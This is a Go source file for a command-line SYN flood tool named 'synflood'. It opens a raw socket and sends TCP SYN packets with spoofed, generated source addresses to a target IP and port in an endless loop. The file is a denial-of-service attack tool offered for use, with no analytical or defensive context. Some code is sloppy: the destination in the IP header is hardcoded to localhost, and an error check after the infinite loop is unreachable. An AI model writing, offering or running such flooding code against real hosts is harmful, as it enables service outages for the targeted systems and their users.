package main

import (
	"log"
	"math/rand"
	"net"
	"os"
	"strconv"
	"strings"
	"syscall"
)

var random int = 0

func main() {
	var err error
	fd, _ := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_RAW)
	var random_port int = 0
	if len(os.Args) < 3 {
		usage()
		os.Exit(0)
	}
	dst_ip := os.Args[1]
	port, err := strconv.ParseUint(os.Args[2], 10, 16)
	if err != nil {
		log.Fatal("Wrong port")
	}
	for {
		p := pkt(dst_ip, uint16(port))
		if random_port > 65000 {
			random_port = 0
		}
		addr := syscall.SockaddrInet4{
			Port: random_port,
			Addr: to4byte(dst_ip),
		}
		err = syscall.Sendto(fd, p, 0, &addr)
		random_port++
	}
	if err != nil {
		log.Fatal("Sendto:", err)
	}
}

func usage() {
	log.Printf("usage: synflood <Destination Ip> <Port>")
}

func gen_random_ip() string {
	if random > 252 {
		random = 0
	}

	b1 := strconv.Itoa(random)
	b2 := strconv.Itoa(random + 1)
	b3 := strconv.Itoa(random + 2)
	b4 := strconv.Itoa(random + 3)
	ip := b1 + "." + b2 + "." + b3 + "." + b4
	return ip
}

func pkt(dst_ip string, port uint16) []byte {
	laddr := gen_random_ip()
	raddr := dst_ip
	packet := TCPHeader{
		Source:      0xaa47, // Random ephemeral port
		Destination: port,
		SeqNum:      rand.Uint32(),
		AckNum:      0,
		DataOffset:  5,      // 4 bits
		Reserved:    0,      // 3 bits
		ECN:         0,      // 3 bits
		Ctrl:        2,      // 6 bits (000010, SYN bit set)
		Window:      0xaaaa, // size of your receive window
		Checksum:    0,      // Kernel will set this if it's 0
		Urgent:      0,
		Options:     []TCPOption{},
	}

	h := Header{
		Version:  4,
		Len:      20,
		TotalLen: 20, // 20 bytes for IP + tcp
		TTL:      64,
		Protocol: 6, // TCP
		Dst:      net.IPv4(127, 0, 0, 1),
		// ID, Src and Checksum will be set for us by the kernel
	}
	data := packet.Marshal()
	packet.Checksum = Csum(data, to4byte(laddr), to4byte(raddr))
	data = packet.Marshal()
	h.TotalLen = h.TotalLen + len(data)
	out, err := h.Marshal()
	if err != nil {
		log.Fatal(err)
	}
	return append(out, data...)
}

func to4byte(addr string) [4]byte {
	parts := strings.Split(addr, ".")
	b0, err := strconv.Atoi(parts[0])
	if err != nil {
		log.Fatalf("to4byte: %s (latency works with IPv4 addresses only, but not IPv6!)\n", err)
	}
	b1, _ := strconv.Atoi(parts[1])
	b2, _ := strconv.Atoi(parts[2])
	b3, _ := strconv.Atoi(parts[3])
	return [4]byte{byte(b0), byte(b1), byte(b2), byte(b3)}
}
